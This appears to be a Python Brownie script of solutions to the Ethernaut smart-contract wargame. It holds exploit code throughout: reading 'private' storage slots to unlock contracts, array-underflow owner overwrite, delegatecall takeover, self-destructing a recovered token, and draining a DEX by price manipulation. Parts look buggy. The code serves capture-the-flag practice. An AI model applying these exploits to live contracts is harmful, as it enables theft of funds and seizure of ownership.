from brownie import config, accounts, network, chain, web3, Atk_Telephone, Telephone, Delegation, Token, GatekeeperOne, Atk_Gate1, \
    Fallback, Vault, Privacy, GatekeeperTwo, Atk_Gate2, NaughtCoin, Atk_Naughtcoin, Preservation, Atk_Preservation, Atk_Recovery, SimpleToken, \
    CreateSolver, MagicNum, AlienCodex, Denial, Atk_Denial, Shop, Atk_Shop, Dex
import rlp
from scripts.config import *


def _slot_to_addr(num):
    return f"0x{num:064x}"


def _get_value_in_slot(slot, addr):
    slot_addr = _slot_to_addr(slot)
    return web3.eth.get_storage_at(addr, slot_addr).hex()


def _get_element_address(addr, index):
    return _slot_to_addr(int(addr, 16) + index)


def main():
    # telephone("")
    # delegation("")
    # gateKeeper1("")
    # fallback("")
    # vault("")
    # privacy("")
    # gateKeeper2("")
    # naughtcoin("")
    # preservation("")
    # recovery("")
    # magic_number("")
    # alien("")
    # denial("")
    # shop("")
    # dex("")
    # dex2("")
    pass


def dex2(addr):
    pass


def dex(addr):
    d = Dex.at(addr)
    t1 = d.token1()
    t2 = d.token2()
    d.approve(d, 100000)
    while (d.balanceOf(t1, addr) != 0) and (d2_bal := d.balanceOf(t2, addr) != 0):
        t1_balance = d.balanceOf(t1, wallet)
        t2_price = d.getSwapPrice(t1, t2, t1_balance)
        if d2_bal >= t2_price > 0:
            print("swap t1 - t2: ", t1_balance)
            d.swap(t1, t2, t1_balance)
        else:
            pass
        d1_bal = d.balanceOf(t1, addr)
        t2_balance = d.balanceOf(t2, wallet)
        t1_price = d.getSwapPrice(t2, t1, t2_balance)
        if d1_bal >= t1_price > 0:
            print("swap t2 - t1: ", t2_balance)
            d.swap(t2, t1, t2_balance)
        else:
            for i in range(t2_balance, 0, -1):
                if d.getSwapPrice(t2, t1, i) == d1_bal:
                    t1_price = i
                    break
            print("swap t2 - t1: ", t1_price)
            d.swap(t2, t1, t1_price)
            break


def shop(addr):
    s = Shop.at(addr)
    atk = Atk_Shop.deploy(s)
    atk.atk()


def denial(addr):
    d = Denial.at(addr)
    atk = Atk_Denial.deploy(d)
    atk.atk()


def alien(addr):
    # owner address: 0x0000000000000000000000000000000000000000000000000000000000000000 : 64 hex
    # array address: 0x0000000000000000000000000000000000000000000000000000000000000001
    # array ? element:  keccak(array addres) + ? = owner address
    al = AlienCodex.at(addr)
    al.make_contact()
    al.retract()
    first_element_addr = web3.keccak(hexstr=_slot_to_addr(1)).hex()
    add = int("f" * 64, 16) - int(first_element_addr, 16) + 1
    al.revise(add, wallet.address)

    pass


def magic_number(addr):
    m = MagicNum.at(addr)

    # method 1: using contract create solver
    # parent = CreateSolver.deploy()
    # parent.create()
    # solver = parent.addr()
    # m.setSolver(solver)

    # method 2:

    # tx = web3.eth.send_transaction({"from": accounts[0].address, "data": "0x69602a6000526001601ff3600052600a6016f3"})
    # tx = chain.get_transaction(tx)
    tx = wallet.transfer(amount=0, data="0x69602a60005260206000f3600052600a6016f3")
    solver = tx.contract_address
    m.setSolver(solver)

    # test
    print(web3.eth.call({"to": solver}).hex())


def recovery(addr):
    # new address = keccak256(rlp([sender_address,sender_nonce]))[12:]

    # calc contract address with 2 way: solidity and python:
    cur_nonce = web3.eth.getTransactionCount(addr) - 1
    # cur_nonce = 0xffff
    atk = Atk_Recovery.deploy()
    lost_addr_sol = atk.contract_address_generator(addr, cur_nonce)

    # rlp encoder same way as solidity: check solidity for algorithm
    encode = rlp.encode([bytes.fromhex(addr[2:]), cur_nonce])
    lost_addr_py = web3.keccak(encode).hex()
    lost_addr_py = web3.toChecksumAddress(lost_addr_py[-40:])  # last 40 hex is address
    assert lost_addr_sol == lost_addr_py, "wrong math"
    print(lost_addr_py)
    t = SimpleToken.at(lost_addr_py)
    print("lost token: ", lost_addr_py)
    t.destroy(wallet)


def preservation(addr):
    p = Preservation.at(addr)
    atk = Atk_Preservation.deploy(p)
    atk.atk()
    print(p.owner())


def telephone(addr):
    Telephone.at(addr)
    tele = Telephone[-1]
    Atk_Telephone.deploy(tele, {"from": accounts[0]})
    atk = Atk_Telephone[-1]
    atk.atk()


def fallback(addr):
    fb = Fallback.at(addr)
    fb.contribute()
    wallet.transfer(fb, 100000, gas_limit=1000000, priority_fee="2 gwei")
    fb.withdraw()


def delegation(addr):
    pwn = web3.keccak(text="pwn()").hex()
    web3.eth.sign_transaction()
    # fallback() not payable => send 0 wei
    wallet.transfer(addr, amount=0, data=pwn, gas_limit=1000000, priority_fee="2 gwei")


def vault(vault_addr):
    key = _get_value_in_slot(1, vault_addr)
    # key_bytes = bytes.fromhex(key[2:])
    v = Vault.at(vault_addr)
    v.unlock(key)


def privacy(addr):
    p = Privacy.at(addr)
    data = _get_value_in_slot(5, addr)
    data_16bytes_hex = data[:-32]
    data_16bytes = bytes.fromhex(data_16bytes_hex[2:])  # s5_value = s5_bytes.hex()
    p.unlock(data_16bytes_hex)


def token(addr):
    accounts.add()
    receiver = accounts[1]
    t = Token.at(addr)
    t.transfer(receiver.address, 21)
    print(t.balanceOf(wallet))


def gateKeeper1(gate_addr):
    # uint16(uint160(tx.origin))
    uint16_wallet = wallet.address[-4:]
    # uint32(uint64(Key)) = uint16_wallet
    uint32_key = uint16_wallet.zfill(8)
    # uint64(Key) != uint32_key
    uint64_key = ("1" + uint32_key).zfill(16)

    gate1 = GatekeeperOne.at(gate_addr)
    atk = Atk_Gate1.deploy(gate1, {"from": wallet})
    # brute force need alot gas
    atk.enter(uint64_key, {"gas": 10000000})
    print(gate1.entrant())


def gateKeeper2(gate_addr):
    Atk_Gate2.deploy(gate_addr)


def naughtcoin(addr):
    n = NaughtCoin.at(addr)
    receiver = Atk_Naughtcoin.deploy(addr)
    balance = n.balanceOf(wallet)
    n.approve(receiver, balance)
    receiver.withdraw()
